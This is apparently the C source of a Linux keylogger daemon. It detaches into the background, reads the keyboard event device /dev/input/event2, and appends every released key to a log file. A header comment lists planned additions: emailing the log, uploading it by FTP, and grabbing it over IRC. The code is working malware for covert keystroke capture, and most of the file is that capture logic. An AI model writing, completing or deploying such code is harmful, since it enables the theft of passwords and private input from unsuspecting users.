/*
* ADD SLEEP
* ADD ERROR IF USER IS NOT ROOT
* DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices)
* ONCE FILE REACHES A CERTAIN SIZE-->EMAIL
* IF STATEMENT--->SEND LOG FILE VIA EMAIL
* ELSE ERROR--->UPLOAD VIA FTP
* GRAB FROM IRC????
*/
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>

#include "keymap.h"

int main(void) {
	FILE *fp = NULL;
	FILE *evlog;
	int fd;
	pid_t process_id = 0;
	pid_t sid = 0;
	struct input_event ev;			/* using input_event so we know 
									 * what we're reading from the 
									 * event file */

	process_id = fork();			/* fork a child process */

	if (process_id < 0) {
		printf("ERROR: fork() failed.\n");
		exit(1);
	}
	if (process_id > 0) {
		// REMOVE printf WHEN DONE
		printf("process_id of child process %d\n", process_id);
		exit(0);
	}

	umask(0);						/* unmask the file mode */

	sid = setsid();					/* set unique session for 
									 * child process */
	if (sid < 0) {
		exit(1);
	}

	chdir("log/");					/* change daemon working 
									 * directory to ROOT */
	close(STDIN_FILENO);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);

	fp = fopen("log.txt", "a+"); 		/* daemon log */
	evlog = fopen("evlog.txt", "a+");  	/* key log */
	fd = open("/dev/input/event2", O_RDONLY|O_TRUNC|O_NONBLOCK);	/* key event file */

	if (evlog == NULL) {
		fprintf(stderr, "ERROR: Log file not found\n");
		return 1;
	}

	time_t curtime;
	time(&curtime);
	fprintf(evlog, "\n\n%s", ctime(&curtime));

	while(1) {
		// sleep(1);
		fflush(fp);

		read(fd, &ev, sizeof(struct input_event));
		if(ev.value == 0 && ev.type == 1) {				/* only register release state */
			fprintf(evlog, "%s", CapKeyMap[ev.code]);
			fflush(evlog);
		}
	}

	fclose(evlog);
	fclose(fp);
	return 0;
}